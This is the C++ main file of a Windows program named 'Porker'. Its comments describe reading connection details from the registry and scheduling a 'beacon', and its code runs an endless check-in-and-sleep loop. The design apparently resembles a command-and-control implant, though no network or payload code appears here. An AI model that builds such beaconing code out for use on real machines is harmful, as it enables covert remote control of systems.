#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include <stdio.h>
#include "Porker.h"


int __cdecl main(void)
{

	/* 
	Startup:
	In this section we will create the main PORKER object that will run all tasks
	The PORKER needs to query the registry and get connection information.
	After getting info PORKER will schedule the BEACON passing the oink to the BEACON

	Main will be the timer for the entire program and thats mostly all.

	*/

	Porker bigPig;

	while(true)
	{
		bigPig.pigPoke();
		printf("-sleeping.....\n");
		Sleep(bigPig.getOinkTime());
		printf("-Initiating next poke\n");
		
	};

	getchar();
	return 0;
}